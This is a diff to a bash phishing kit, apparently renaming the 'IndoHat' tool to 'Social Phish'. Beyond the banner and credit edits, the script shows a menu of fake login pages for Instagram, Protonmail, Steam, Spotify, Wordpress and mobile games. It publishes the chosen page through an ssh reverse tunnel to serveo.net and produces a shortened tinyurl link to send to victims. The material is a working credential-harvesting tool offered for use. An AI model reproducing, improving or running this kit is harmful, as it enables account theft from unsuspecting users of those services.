@@ -1,7 +1,7 @@
 #!/usr/bin/bash
-# Modern Phising The Indohat
-# Coded by Senja
-# Github: github.com/thesixtynine/IndoHat
+# Modern Phising The Social Phish
+# Mod by The Sixty Nine
+# Github: github.com/thesixtynine/Socialfish
 
 checkroot() {
 
@@ -57,25 +57,17 @@ banner() {
 
 printf "\n"
 printf "\n"
-printf "\e[0;31m  ██╗███╗   ██╗██████╗  ██████╗ \e[0;37m██╗  ██╗ █████╗ ████████╗\n\e[0m"
-printf "\e[0;31m  ██║████╗  ██║██╔══██╗██╔═══██╗\e[0;37m██║  ██║██╔══██╗╚══██╔══╝\n\e[0m"
-printf "\e[0;31m  ██║██╔██╗ ██║██║  ██║██║   ██║\e[0;37m███████║███████║   ██║   \n\e[0m"
-printf "\e[0;31m  ██║██║╚██╗██║██║  ██║██║   ██║\e[0;37m██╔══██║██╔══██║   ██║   \n\e[0m"
-printf "\e[0;31m  ██║██║ ╚████║██████╔╝╚██████╔╝\e[0;37m██║  ██║██║  ██║   ██║   \n\e[0m"
-printf "\e[0;31m  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ \e[0;37m╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   \n\e[0m"
-printf "\e[0;4;37m  ○● 千尺丨乇几ᗪ丂 ㄒ卄乇 Ꮆ尺卂ㄚ 卄卂ㄒ 爪ㄚ ㄒ乇卂爪 ●○\n\e[0m"
-printf "\n"
+printf "\e[0;31m        █▀▀ █▀█ █▀▀ ▀█▀ █▀█ █     \e[0;37m█▀▀ ▀█▀ █▀▀ █ █\n"
+printf "\e[0;31m        ▀▀█ █ █ █    █  █▀█ █     \e[0;37m█▀▀  █  ▀▀█ █▀█\n"
+printf "\e[0;31m        ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀ ▀ ▀▀▀   \e[0;37m▀   ▀▀▀ ▀▀▀ ▀ ▀\n"
 printf "\n"
 
 }
 
 template() {
 
-sleep 1
-printf "\e[0m[\e[1;94m#\e[0m] \e[0mModern Phising The IndoHat\n\e[0m"
-sleep 1
-printf "\e[0m[\e[1;93m*\e[0m] \e[0mCoded by Senja\n\e[0"
-sleep 1
+printf "\e[0m[\e[1;94m#\e[0m] \e[0mModern Phising Social Phish\n\e[0m"
+printf "\e[0m[\e[1;93m*\e[0m] \e[0mMod by The Sixty Nine\n\e[0"
 printf "\e[0m[\e[1;96m&\e[0m] \e[0mMy Github: @thesixtynine\n\e[0m"
 sleep 1
 
@@ -93,7 +85,7 @@ printf "\e[0m[\e[1;92m06\e[0m] \e[1;77mWordpress     \e[0m[\e[1;92m13\e[0m] \e[1
 printf "\e[0m[\e[1;92m07\e[0m] \e[1;77mProtonmail    \e[0m[\e[1;92m14\e[0m] \e[1;77mSteam         \e[0m[\e[1;92m00\e[0m] \e[1;77mExit\n"
 printf "\n"
 
-read -p $'\n\e[0m[\e[0m\e[95m/\e[0m\e[0m] Select an option: \e[0;1;77m\en' option
+read -p $'\n\e[0m[\e[0m\e[95m/\e[0m\e[0m] \e[1;77mSelect an option: \e[0m\en' option
 
 if [[ $option == 01 || $option == 1 ]]; then
 server="instagram"
@@ -164,7 +156,7 @@ server="spotify"
 start1
 
 elif [[ $option == 18 ]]; then
-server="instafollow"
+server="instafollowers"
 start1
 
 elif [[ $option == 19 ]]; then
@@ -172,14 +164,13 @@ gamemobile
 
 elif [[ $option == 20 ]]; then
 server="create"
-createfage
+createpage
 start1
 
 elif [[ $option == 00 || $option == 0 ]]; then
 echo
 printf "\e[0m[\e[1;91m!\e[0m] \e[0;1;77mExit the program!\n\e[0m"
 echo
-sleep 1
 exit 1
 
 else
@@ -199,7 +190,7 @@ gamemobile() {
 
 printf "\n"
 printf "\e[0m[\e[1;94m01\e[0m] \e[1;77mMobileLegends \e[0m[\e[1;94m03\e[0m] \e[1;77mFreeFiere     \e[0m[\e[1;94m05\e[0m] \e[1;77mArenaOfValor\n"
-printf "\e[0m[\e[1;94m02\e[0m] \e[1;77mClashOfClans  \e[0m[\e[1;94m04\e[0m] \e[1;77mPUBGMobile    \e[0m[\e[1;94m06\e[0m] \e[1;77mLordMobile\n"
+printf "\e[0m[\e[1;94m02\e[0m] \e[1;77mClashOfClans  \e[0m[\e[1;94m04\e[0m] \e[1;77mPUBGMobile    \e[0m[\e[1;94m06\e[0m] \e[1;77mLordsMobile\n"
 printf "\n"
 
 read -p $'\n\e[0m[\e[0m\e[93m+\e[0m\e[0m] Select an option: \e[0;1;77m\en' option
@@ -225,7 +216,7 @@ server="arenaofvalor"
 start1
 
 elif [[ $option == 06 || $option == 6 ]]; then
-server="lordmobile"
+server="lordsmobile"
 start1
 
 else
@@ -426,7 +417,6 @@ $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:
 printf "\n"
 sleep 10
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-printf "\n"
 printf '\n\e[0m[\e[1;94m*\e[0m] Send the direct link:\e[0m\e[1;77m %s \n' $send_link
 send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
 printf '\n\e[0m[\e[1;93m*\e[0m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
